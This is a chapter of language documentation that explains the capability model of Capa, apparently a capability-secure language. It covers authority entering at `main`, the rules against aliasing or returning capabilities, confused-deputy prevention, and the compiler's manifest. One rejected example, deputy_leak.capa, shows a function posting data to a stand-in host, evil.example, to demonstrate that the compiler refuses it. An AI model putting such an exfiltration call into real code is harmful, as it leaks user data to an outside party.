# 10. The capability model

> **What this chapter covers.** How authority enters a Capa program and
> how it propagates: capabilities as unforgeable values; the absence of
> ambient authority (no global, `import`, constructor or literal
> produces a capability; the runtime hands all authority to `main`);
> the propagation discipline (no aliasing, no returning of built-ins,
> no fabrication); the elimination of the confused
> deputy; and the authority-chain-in-the-types property, verified
> against the manifest. The 10 concrete capabilities are in
> [11-builtin-capabilities.md](11-builtin-capabilities.md); attenuation
> in [12-attenuation.md](12-attenuation.md).

**Version documented.** `main` at commit `8e2c609` (`capa 1.32.0` plus
unreleased commits). Every transcript re-run at that commit on
2026-09-10, `python -m capa` importing the checkout under specification.

Depends on: [02-authority-in-types.md](02-authority-in-types.md).

---

## 1. Where authority enters: the runtime hands everything to `main`

A Capa program calls a built-in capability (to print, read a file,
open a socket, read the environment, run a process) only through a
**capability value** that reached the calling function. These values do
not appear in the middle of the program: they enter at a single point,
the entry point's signature. The runtime (the Python backend or the
Wasm host) constructs the capabilities `main` asks for, one per
parameter, and passes them in the startup call. From there on there is
only propagation: `main` decides who gets what.

`main` declares the capabilities it needs as parameters, and the
runtime materializes them:

```capa
// thread.capa
fun greet(stdio: Stdio, name: String)
    stdio.println("Hello, ${name}")

fun main(stdio: Stdio)
    greet(stdio, "Ana")
    greet(stdio, "Rui")
```

```
$ python -m capa --run thread.capa
Hello, Ana
Hello, Rui
$ python -m capa --run --wasm thread.capa
Hello, Ana
Hello, Rui
```

The two backends produce identical output. `main` received `Stdio` from
the runtime and propagated it to `greet` by explicit argument. There is
no other door: a built-in capability `main` does not request in its
signature is never constructed.

## 2. No ambient access to the built-in capabilities

**Ambient authority** is any authority a function exercises without
having received it: a global `open`, an `import socket`, a constructor
that fabricates it. Capa has none of these doors for its ten built-in
capabilities.

- **No global produces it.** There is no capability in the global scope
  a leaf function could reach. A reference to a capability name that
  was not received is an `undefined name`.
- **No `import` produces it.** Importing a module brings functions and
  types, not authority; authority still has to flow by parameter (see
  [08-functions-closures-modules.md](08-functions-closures-modules.md)).
- **No constructor produces it.** A built-in capability is not a struct
  type: there is no `Stdio {}` literal that constructs it (see the
  `forge` example in
  [02-authority-in-types.md](02-authority-in-types.md)).

A leaf function that tries to use `net` without receiving it has no
environment to find it in:

```capa
// deputy_leak.capa
fun render(name: String) -> String
    net.post("http://evil.example/", name)
    return "Hello, ${name}"

fun main(stdio: Stdio)
    stdio.println(render("Ana"))
```

```
$ python -m capa --check deputy_leak.capa
deputy_leak.capa:3:5: error: undefined name 'net'
   3 |     net.post("http://evil.example/", name)
           ^

deputy_leak.capa: 1 error
```

`render` receives no `Net`, so the name `net` does not exist in its
body. `render` cannot call `Net` unless a `Net` reaches it, and the
compiler refuses the program otherwise; for this `render`, whose only
parameter is a `String`, that means declaring `net: Net` in its
signature.

## 3. The propagation discipline

A built-in capability value moves by being **passed as an argument**,
or by being captured in a closure or held in a field of a
capability-bearing struct that is then passed
([08-functions-closures-modules.md](08-functions-closures-modules.md)
section 5.1,
[13-user-defined-capabilities.md](13-user-defined-capabilities.md)).
Three static rules close the other routes. All are enforced by the
analyzer at compile time (`--check`), not by a runtime monitor. A
signature that carries a function value is marked in the manifest as
not provable from its types (section 5).

**(a) A capability cannot be aliased into a binding.** Copying a
capability into a `let`/`var` is refused; the capability keeps existing
only as a parameter, with no second name through which it could escape
the flow analysis.

```capa
// alias_cap.capa
fun main(fs: Fs, stdio: Stdio)
    let backdoor = fs
    stdio.println("aliased")
```

```
$ python -m capa --check alias_cap.capa
alias_cap.capa:3:5: error: capability 'Fs' cannot appear in a 'let' binding; capabilities only flow through function parameters
   3 |     let backdoor = fs
           ^

alias_cap.capa: 1 error
```

**(b) A built-in capability cannot be returned by a function.**
Built-in capabilities only flow "inward" (by parameter), never
"outward" (by return). No regular function "produces" a built-in
capability: a function that holds one was handed it.

```capa
// return_cap.capa
fun grab(fs: Fs) -> Fs
    return fs

fun main(fs: Fs, stdio: Stdio)
    let f = grab(fs)
    stdio.println("got it")
```

```
$ python -m capa --check return_cap.capa
return_cap.capa:2:1: error: capability 'Fs' cannot appear in return type of function 'grab'; built-in capabilities only flow through function parameters
   2 | fun grab(fs: Fs) -> Fs
       ^

return_cap.capa: 1 error
```

The restriction is on **built-in** capabilities. A user-defined
capability can be returned by a factory (it is an ordinary Capa value
that wraps built-in authority in a field); see
[13-user-defined-capabilities.md](13-user-defined-capabilities.md).

**(c) A capability cannot be fabricated from data.** There is no
literal or constructor for a built-in capability (section 2 and the
`forge` example in [02](02-authority-in-types.md)). The only value of
type `Fs` in a program is the one that entered through `main` and was
passed on (or an attenuation of it, see
[12-attenuation.md](12-attenuation.md)).

JUDGEMENT. The three rules together give the central property: **a
function can call a built-in capability only if a value of it reached
the function**. No global, import, constructor, alias or return yields
one.

## 4. Eliminating the confused deputy

The **confused deputy** (Norm Hardy, 1988) is the pattern where a
privileged component is induced to use its authority on behalf of a
caller who should not have it. The root cause is ambient authority: the
deputy holds authority that comes not from the request but from the
environment, and cannot separate the legitimate request from the
abusive one.

In Capa the pattern is closed for the built-in capabilities. A
component can call only the built-in capabilities handed to it with the
request; if the caller has no `Fs`, it cannot pass `Fs`, and the deputy
has no ambient `Fs` to use instead. A function without capability
parameters, and without function-typed parameters, holds no built-in
capability and cannot call one.

`render` computes a string and receives no capability; it can call no
built-in capability, and the compiler accepts it:

```capa
// deputy.capa
fun render(name: String) -> String
    return "Hello, ${name}"

fun main(stdio: Stdio)
    stdio.println(render("Ana"))
```

```
$ python -m capa --run deputy.capa
Hello, Ana
$ python -m capa --run --wasm deputy.capa
Hello, Ana
```

The two backends produce identical output. The version of `render` that
tries to abuse the network (`deputy_leak.capa`, section 2) does not
even compile. Authority and designation (the argument) are the same
thing, which is the definition of the object-capability property (see
[02-authority-in-types.md](02-authority-in-types.md)).

## 5. The authority chain in the types

Because built-in authority is carried by typed values, the compiler can
**derive** (not ask the author to declare) a per-function capability
record from the type-checked program. `--manifest` records, per
function, the capabilities declared in the signature, those the
manifest pass finds reachable through its signature types and body, and
the **provably excluded** ones.

An excerpt of the manifest of `thread.capa` (section 1):

```
$ python -m capa --manifest thread.capa
...
      "name": "greet",
      "declared_capabilities": [ "Stdio" ],
      "transitively_reachable_capabilities": [ "Stdio" ],
      "provably_excluded_capabilities": [
        "Clock", "Db", "Env", "Fs", "Net", "Proc", "Random", "Serve", "Unsafe"
      ],
      "authority_provable_from_types": true,
      "ceiling_authority_provable": true,
...
```

`provably_excluded_capabilities` lists the nine capabilities the
manifest pass found no path to from `greet`'s signature types and body;
it is derived by the compiler, not written by the author. For `greet`,
which receives only `Stdio` and no function value, the nine exclusions
follow from the rule that a built-in capability cannot be constructed,
aliased or returned. `authority_provable_from_types: true` means the
function crosses no `Unsafe` and no function type is reachable from its
signature or from a value its body constructs. The manifest, CycloneDX
and SPDX carry the exclusion set; VEX and provenance do not. The
complete envelope structure is in
[29-capability-manifest.md](29-capability-manifest.md).

## 6. What the model guarantees, and where it ends

- **Guarantees** (static, every program that passes `--check`): no
  function calls a built-in capability that is not in scope; a built-in
  capability cannot be constructed, aliased into a binding or returned.
  The `lambda_cap` core of these rules is formalized in Agda (see
  [`proofs/README.md`](../proofs/README.md)); the translation from full
  Capa to that core is not mechanized.
- **Does not guarantee by itself** the integrity of the runtime that
  materializes the capabilities. On the Python backend the host is
  **trusted** (capabilities are Python objects). On the Wasm backend
  the boundary is the component's WASI import set, narrower, but the
  central model remains the type (see
  [23-wasi-and-runtime-attenuation.md](23-wasi-and-runtime-attenuation.md)).
- **It is orthogonal to IFC.** Capabilities answer "which effects can
  this function exercise", not "where can a sensitive value flow". That
  second question belongs to information-flow control, a distinct and
  complementary layer
  ([15-ifc-model-and-labels.md](15-ifc-model-and-labels.md) and
  [16-ifc-analyzer-and-tiers.md](16-ifc-analyzer-and-tiers.md)).

---

## Links

- [02-authority-in-types.md](02-authority-in-types.md): the theory
  (object-capabilities, POLA, confused deputy) and the prior art.
- [11-builtin-capabilities.md](11-builtin-capabilities.md): the 10
  concrete built-in capabilities and their methods.
- [12-attenuation.md](12-attenuation.md): deriving a strictly weaker
  version of a capability.
- [13-user-defined-capabilities.md](13-user-defined-capabilities.md):
  the implementor pattern that wraps built-in authority while keeping
  the chain readable.
- [29-capability-manifest.md](29-capability-manifest.md): from the
  model to the supply-chain artefact.
- [23-wasi-and-runtime-attenuation.md](23-wasi-and-runtime-attenuation.md):
  where capability materialization differs by backend.
